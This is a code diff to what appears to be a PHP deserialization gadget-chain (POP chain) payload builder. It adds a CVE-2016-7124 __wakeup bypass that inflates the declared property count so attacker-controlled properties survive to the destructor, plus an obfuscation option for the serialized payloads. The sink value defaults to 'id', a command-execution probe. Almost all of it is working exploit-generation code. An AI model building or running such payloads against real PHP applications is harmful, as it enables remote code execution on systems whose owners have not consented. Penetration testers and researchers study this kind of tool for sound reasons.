@@ -7,6 +7,7 @@ use PopChain\Model\ArgInfo;
 use PopChain\Model\Chain;
 use PopChain\Model\ClassInfo;
 use PopChain\Model\Edge;
+use PopChain\Model\MethodInfo;
 use PopChain\Model\PropertyInfo;
 
 /**
@@ -21,14 +22,22 @@ final class PayloadBuilder
     /** 最近一次 build() 是否真的把 sink 值写进了 payload。 */
     public bool $sinkValueWritten = false;
 
+    /** 最近一次 build() 是否用了 CVE-2016-7124 的 __wakeup 绕过（补一个多余属性）。 */
+    public bool $wakeupBypassUsed = false;
+
+    /** @var array<int, PayloadNode> 需要用多余属性触发 __wakeup 跳过的节点 */
+    private array $nodesNeedingPad = [];
+
     /** @param array<string, ClassInfo> $classes */
-    public function __construct(private array $classes)
+    public function __construct(private array $classes, private bool $obfuscate = false)
     {
     }
 
     public function build(Chain $chain, mixed $value = 'id'): string
     {
         $this->sinkValueWritten = false;
+        $this->wakeupBypassUsed = false;
+        $this->nodesNeedingPad = [];
         $nodes = [0 => new PayloadNode($chain->entryClass->name)];
         $current = 0;
 
@@ -49,8 +58,9 @@ final class PayloadBuilder
 
         $this->fillArraySlots($chain, $nodes, $fromNode);
         $this->applySinkValue($chain, $nodes, $fromNode, $current, $value);
+        $this->padWakeupBlockedNodes($nodes);
 
-        return (new Serializer())->serializeNode($nodes[0]);
+        return (new Serializer($this->obfuscate))->serializeNode($nodes[0]);
     }
 
     /** 方法调用 / 静态调用不改变对象图，只是同一个对象内的跳转。 */
@@ -254,6 +264,12 @@ final class PayloadBuilder
 
     private function setProperty(PayloadNode $node, ClassInfo $class, string $name, mixed $value): void
     {
+        // 这个属性会被 __wakeup 重置成字面量时，需要 CVE-2016-7124 的绕过
+        $objectClass = $this->classes[$node->class] ?? $class;
+        if ($this->propertyOverwrittenByWakeup($objectClass, $name)) {
+            $this->nodesNeedingPad[spl_object_id($node)] = $node;
+        }
+
         $property = $this->findProperty($class, $name);
         $node->set(
             $name,
@@ -261,6 +277,69 @@ final class PayloadBuilder
             $property?->visibility ?? 'public',
             $property?->declaringClass ?? $class->name,
         );
+    }
+
+    /**
+     * 被 __wakeup 重置的属性：把声明的属性个数多写 1 个、body 少给一个，
+     * unserialize 会在该对象处解析失败；失败时 __wakeup 被跳过，但已构造对象的析构函数照跑，
+     * 可控属性因此得以保留（CVE-2016-7124 的利用方式）。
+     *
+     * @param array<int, PayloadNode> $nodes
+     */
+    private function padWakeupBlockedNodes(array $nodes): void
+    {
+        foreach ($this->nodesNeedingPad as $node) {
+            $class = $this->classes[$node->class] ?? null;
+            if ($class === null) {
+                continue;
+            }
+            // 声明数必须大于类的实际属性数，body 里又不给足，unserialize 才会在该对象处失败
+            $actual = $this->propertyCount($class);
+            $node->declaredBump = max(1, $actual + 1 - count($node->properties));
+            $this->wakeupBypassUsed = true;
+        }
+    }
+
+    /** 类（含父类）声明的属性个数。 */
+    private function propertyCount(ClassInfo $class): int
+    {
+        $count = 0;
+        $seen = [];
+        $current = $class;
+        while ($current !== null && !isset($seen[$current->name])) {
+            $seen[$current->name] = true;
+            $count += count($current->properties);
+            $current = $current->parent !== null ? ($this->classes[$current->parent] ?? null) : null;
+        }
+        return $count;
+    }
+
+    /** 类（含父类）的 __wakeup 是否把这个属性写成了字面量。 */
+    private function propertyOverwrittenByWakeup(ClassInfo $class, string $property): bool
+    {
+        if ($this->findMethod($class, '__unserialize') !== null) {
+            return false;
+        }
+        $wakeup = $this->findMethod($class, '__wakeup');
+        if ($wakeup === null) {
+            return false;
+        }
+        return in_array($property, $wakeup->constantProperties, true);
+    }
+
+    private function findMethod(ClassInfo $class, string $name): ?MethodInfo
+    {
+        $seen = [];
+        $current = $class;
+        while ($current !== null && !isset($seen[$current->name])) {
+            $seen[$current->name] = true;
+            $method = $current->method($name);
+            if ($method !== null) {
+                return $method;
+            }
+            $current = $current->parent !== null ? ($this->classes[$current->parent] ?? null) : null;
+        }
+        return null;
     }
 
     private function findProperty(ClassInfo $class, string $name): ?PropertyInfo
